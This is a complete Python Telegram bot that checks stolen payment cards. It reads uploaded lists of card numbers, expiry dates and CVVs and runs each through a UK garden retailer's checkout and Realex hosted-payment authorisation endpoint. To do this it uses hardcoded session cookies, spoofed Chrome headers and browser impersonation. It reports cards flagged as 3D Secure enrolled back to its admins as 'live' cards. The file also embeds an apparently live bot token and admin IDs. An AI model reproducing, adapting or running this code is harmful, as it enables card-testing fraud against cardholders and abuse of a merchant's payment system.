# -*- coding: utf-8 -*-
import asyncio
import json
import re
import os
from datetime import datetime

from curl_cffi import requests as curl_requests
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# ========== CONFIGURATION ==========
BOT_TOKEN  = "8334507568:AAEJakB6G_kPVNOX6r3vZGc8ZqcLPhOmCLM"
ADMIN_IDS  = [5895491379, 6220135474, 844663875]

# ========== COOKIES (dobies) ==========
COOKIES = {
    'CFID': 'Z2xf40m81pc0g6zzrb1cnsaxp1nfu6d6v3prpe6ibgaanox4izi-3076137',
    'CFTOKEN': 'Z2xf40m81pc0g6zzrb1cnsaxp1nfu6d6v3prpe6ibgaanox4izi-43ce2a3e3db97399-F5707BCC-CECC-7437-85C7299C8C287988',
    'CFGLOBALS': 'urltoken%3DCFID%23%3D3076137%26CFTOKEN%23%3D43ce2a3e3db97399%2DF5707BCC%2DCECC%2D7437%2D85C7299C8C287988%23lastvisit%3D%7Bts%20%272026%2D02%2D21%2006%3A45%3A30%27%7D%23hitcount%3D6%23timecreated%3D%7Bts%20%272026%2D02%2D21%2006%3A45%3A26%27%7D%23cftoken%3D43ce2a3e3db97399%2DF5707BCC%2DCECC%2D7437%2D85C7299C8C287988%23cfid%3D3076137%23',
    '__cf_bm': '7.jXpbi6L6gPKat_UDFJT5vlftQB5Lczd73t2_6.OKU-1771656328-1.0.1.1-TSgH8sb9mNPgMOvdM2y1veZrNqIVESusIcDQcKDhIJf66LuTshoMW63HmKkyngrd3rv.h6c5uRHXXX2zcIxdBfSc3nxaKuNQI4r_5.qBajU',
    'ServerID': '1026',
    'WISH': '%5B%5D',
    'GIFTS': '%5B%5D',
    'SEEDSACCESS': '1',
}

CHECKOUT_HEADERS = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dnt': '1',
    'priority': 'u=0, i',
    'referer': 'https://pay.realexpayments.com/',
    'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
}

BASE_HEADERS = {
    'Accept': '*/*',
    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'DNT': '1',
    'Origin': 'https://pay.realexpayments.com',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Storage-Access': 'active',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

# ========== SESSION MANAGEMENT ==========
user_sessions = {}

def get_user_stats(user_id):
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            'total': 0,
            'checking': 0,
            'success_3ds': 0,
            'failed': 0,
            'errors': 0,
            'start_time': None,
            'is_running': False,
            'dashboard_message_id': None,
            'chat_id': None,
            'current_card': '',
            'last_response': 'Waiting...',
            'cards_checked': 0,
            'success_cards': [],
        }
    return user_sessions[user_id]

def reset_user_stats(user_id):
    if user_id in user_sessions:
        user_sessions[user_id].update({
            'total': 0,
            'checking': 0,
            'success_3ds': 0,
            'failed': 0,
            'errors': 0,
            'start_time': None,
            'is_running': False,
            'current_card': '',
            'last_response': 'Waiting...',
            'cards_checked': 0,
            'success_cards': [],
        })

# ========== HELPERS ==========
def base_card_data(cc, guid):
    return {
        'pas_cctype': 'MC',
        'pas_pareq': '', 'pas_acsurl': '', 'pas_termurl': '',
        'encryptMD': '', 'verifyMessage': '', 'verifyResult': '', 'verifyEnrolled': '',
        'pas_ccnum': cc,
        'cardIdentifyError': '',
        'pas_expiry': '', 'pas_cccvc': '', 'pas_issuenumber': '', 'pas_ccname': '',
        'guid': guid,
        'dccchoice': '', 'dccrate': '',
        'hppInstallmentPlanId': '', 'hppInstallmentTcVersion': '', 'hppInstallmentTcLang': '',
    }

# ========== CARD CHECKER ==========
async def check_card(card, bot_app, user_id):
    stats = get_user_stats(user_id)
    if not stats['is_running']:
        return card, "STOPPED"

    parts = card.strip().split('|')
    if len(parts) != 4:
        stats['errors'] += 1
        return card, "ERROR"

    cc, mm, yy, cvv = parts
    yy2 = yy[-2:]
    mmyy = f"{mm}/{yy2}"

    try:
        # STEP 1 - Get GUID
        loop = asyncio.get_event_loop()
        resp = await loop.run_in_executor(None, lambda: curl_requests.get(
            'https://www.dobies.co.uk/checkout/delivery',
            cookies=COOKIES,
            headers=CHECKOUT_HEADERS,
            impersonate="chrome110",
            timeout=30,
        ))

        guid_match = re.search(r'card\.html\?guid=([\w-]+)', resp.text)
        guid = guid_match.group(1) if guid_match else None
        if not guid:
            stats['errors'] += 1
            stats['last_response'] = 'GUID Error'
            return card, "ERROR"

        referer = f'https://pay.realexpayments.com/hosted-payments/blue/card.html?guid={guid}'
        hdrs = {**BASE_HEADERS, 'Referer': referer}

        # STEP 2 - verifyEnrolled
        await loop.run_in_executor(None, lambda: requests.post(
            'https://pay.realexpayments.com/hosted-payments/blue/3ds2/verifyEnrolled',
            headers=hdrs, data=base_card_data(cc, guid), timeout=20,
        ))

        # STEP 3 - cardIdentification
        await loop.run_in_executor(None, lambda: requests.post(
            'https://pay.realexpayments.com/hosted-payments/blue/api/cardIdentification',
            headers=hdrs, data=base_card_data(cc, guid), timeout=20,
        ))

        # STEP 4 - auth
        auth_data = {
            **base_card_data(cc, guid),
            'pas_expiry': mmyy,
            'pas_cccvc': cvv,
            'pas_ccname': 'saaf',
            'browserJavaEnabled': 'false',
            'browserLanguage': 'ar',
            'screenColorDepth': '24',
            'screenHeight': '786',
            'screenWidth': '1397',
            'timezoneUtcOffset': '-120',
            'paymentFormHeight': '660',
            'paymentFormWidth': '600',
        }

        resp_auth = await loop.run_in_executor(None, lambda: requests.post(
            'https://pay.realexpayments.com/hosted-payments/blue/api/auth',
            headers=hdrs, data=auth_data, timeout=30,
        ))

        data = resp_auth.json()

        # --- تحليل النتيجة ---
        encoded_creq = (data.get('data', {}) or {}).get('verifyEnrolledResult', {}) or {}
        if encoded_creq.get('encodedCreq'):
            # 3D
            stats['success_3ds'] += 1
            stats['success_cards'].append(card)
            stats['last_response'] = '3D'
            await send_result(bot_app, card, "3D", user_id)
            return card, "3D"
        else:
            # DECLINE
            result_code = (data.get('data', {}) or {}).get('response', {}) or {}
            code = result_code.get('result', data.get('status', '?'))
            stats['failed'] += 1
            stats['last_response'] = f'DECLINE ({code})'
            return card, "DECLINE"

    except Exception as e:
        stats['errors'] += 1
        stats['last_response'] = f'Error: {str(e)[:30]}'
        return card, "ERROR"


async def send_result(bot_app, card, status_type, user_id):
    stats = get_user_stats(user_id)
    if status_type == "3D":
        text = (
            f"✅ *3D SECURE*\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"💳 `{card}`\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"🟢 *Status:* LIVE - 3D Enrolled"
        )
        await bot_app.bot.send_message(
            chat_id=stats['chat_id'],
            text=text,
            parse_mode='Markdown'
        )

# ========== DASHBOARD ==========
def create_dashboard_keyboard(user_id):
    stats = get_user_stats(user_id)
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)

    keyboard = [
        [InlineKeyboardButton(f"🔥 Total: {stats['total']}", callback_data="noop")],
        [
            InlineKeyboardButton(f"🔄 Checking: {stats['checking']}", callback_data="noop"),
            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="noop"),
        ],
        [
            InlineKeyboardButton(f"✅ 3DS: {stats['success_3ds']}", callback_data="noop"),
            InlineKeyboardButton(f"❌ Declined: {stats['failed']}", callback_data="noop"),
        ],
        [
            InlineKeyboardButton(f"🚫 Errors: {stats['errors']}", callback_data="noop"),
            InlineKeyboardButton(f"📊 Done: {stats['cards_checked']}/{stats['total']}", callback_data="noop"),
        ],
        [InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="noop")],
    ]

    if stats['current_card']:
        keyboard.append([InlineKeyboardButton(f"🔍 {stats['current_card']}", callback_data="noop")])

    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("🛑 Stop", callback_data="stop_check")])

    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app, user_id):
    stats = get_user_stats(user_id)
    if stats['dashboard_message_id'] and stats['chat_id']:
        try:
            await bot_app.bot.edit_message_text(
                chat_id=stats['chat_id'],
                message_id=stats['dashboard_message_id'],
                text="📊 *DOBIES CHECKER - LIVE DASHBOARD* 📊",
                reply_markup=create_dashboard_keyboard(user_id),
                parse_mode='Markdown'
            )
        except Exception:
            pass

# ========== PROCESS CARDS ==========
async def process_cards(cards, bot_app, user_id):
    stats = get_user_stats(user_id)

    for i, card in enumerate(cards):
        if not stats['is_running']:
            stats['last_response'] = 'Stopped'
            await update_dashboard(bot_app, user_id)
            break

        parts = card.split('|')
        masked = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 and len(parts[0]) > 10 else card
        stats['current_card'] = masked
        stats['checking'] = 1

        await update_dashboard(bot_app, user_id)

        await check_card(card, bot_app, user_id)

        stats['cards_checked'] += 1
        stats['checking'] = 0

        await update_dashboard(bot_app, user_id)
        await asyncio.sleep(0.3)

    stats['is_running'] = False
    stats['checking'] = 0
    stats['current_card'] = ''
    stats['last_response'] = 'Completed ✅'
    await update_dashboard(bot_app, user_id)

    # ارسال ملف الـ 3D
    if stats['success_cards']:
        success_text = "\n".join(stats['success_cards'])
        filename = f"3ds_{user_id}_{int(datetime.now().timestamp())}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(success_text)
        await bot_app.bot.send_document(
            chat_id=stats['chat_id'],
            document=open(filename, "rb"),
            caption=f"✅ *3DS Live Cards* - {len(stats['success_cards'])} cards",
            parse_mode='Markdown'
        )
        os.remove(filename)

# ========== TELEGRAM HANDLERS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("Unauthorized")
        return
    await update.message.reply_text(
        "╔═══════════════════════╗\n"
        "🚀 *DOBIES CC CHECKER* 🚀\n"
        "╚═══════════════════════╝\n\n"
        "📄 ابعت ملف `.txt` فيه الكروت\n"
        "📌 Format: `number|MM|YYYY|CVV`\n\n"
        "✅ بيبعت رسالة فقط لو *3D LIVE*\n"
        "❌ الرفض مش بيبعت رسالة",
        parse_mode='Markdown'
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("Unauthorized")
        return

    user_id = update.effective_user.id
    stats = get_user_stats(user_id)

    if stats['is_running']:
        await update.message.reply_text("⚠️ في فحص شغال دلوقتي! وقفه الاول.")
        return

    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]

    if not cards:
        await update.message.reply_text("الملف فاضي!")
        return

    reset_user_stats(user_id)
    stats.update({
        'total': len(cards),
        'start_time': datetime.now(),
        'is_running': True,
        'chat_id': update.effective_chat.id,
    })

    dashboard_msg = await update.message.reply_text(
        "📊 *DOBIES CHECKER - LIVE DASHBOARD* 📊",
        reply_markup=create_dashboard_keyboard(user_id),
        parse_mode='Markdown'
    )
    stats['dashboard_message_id'] = dashboard_msg.message_id

    asyncio.create_task(process_cards(cards, context.application, user_id))

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("Unauthorized", show_alert=True)
        return
    try:
        await query.answer()
    except Exception:
        pass

    user_id = query.from_user.id
    stats = get_user_stats(user_id)

    if query.data == "stop_check" and stats['is_running']:
        stats['is_running'] = False
        stats['last_response'] = 'Stopped'
        await update_dashboard(context.application, user_id)
        await context.application.bot.send_message(
            chat_id=stats['chat_id'],
            text="🛑 *تم ايقاف الفحص*",
            parse_mode='Markdown'
        )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    print("[+] Bot started...")
    app.run_polling()

if __name__ == "__main__":
    main()
